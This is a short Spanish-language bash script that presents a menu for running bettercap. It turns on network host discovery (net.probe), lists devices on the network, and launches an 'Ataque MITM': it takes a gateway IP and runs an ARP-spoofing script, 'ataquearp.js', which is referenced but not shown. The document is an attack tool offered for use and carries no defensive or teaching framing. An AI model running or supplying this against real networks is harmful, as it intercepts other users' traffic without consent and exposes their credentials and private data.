#!/bin/bash

# Función para mostrar el menú por pantalla
mostrar_menu() {
    echo "Bienvenido al menú de opciones:"
    echo "1. Activar net.probe"
    echo "2. Mostrar Dispositivos en red"
    echo "3. Ataque MITM"
    echo "4. Salir"
}

# Función para activar net.probe
activar_net_probe() {
    echo "Activando net.probe..."
    sudo bettercap -eval 'net.probe on'
    sleep 1
 
   
}
activar_ticker_on() {
    echo "Activando ticker on..."
    sleep 3
    sudo bettercap -script lanzar.js
    echo "exit para salir"
    }
iniciar_ataque() {
    echo "Introduce la IP gateway:"
    read gateway
    sudo bettercap -eval "set ip_gateway $gateway ; exit"
    sleep 2
    echo "Realizando ataque..."
    sleep 3
    sudo bettercap -script ataquearp.js
}
# Loop principal del programa
while true; do
    # Mostrar el menú
    mostrar_menu

    # Pedir al usuario que elija una opción
    read -p "Seleccione una opción: " opcion

    # Ejecutar la opción seleccionada
    case $opcion in
        1)
            activar_net_probe
            ;;
        2)
            activar_ticker_on
            ;;
        3)
            iniciar_ataque
            ;;
        4)
            echo "Saliendo del script..."
            exit 0
            ;;
        *)
            echo "Opción inválida."
            ;;
    esac
done
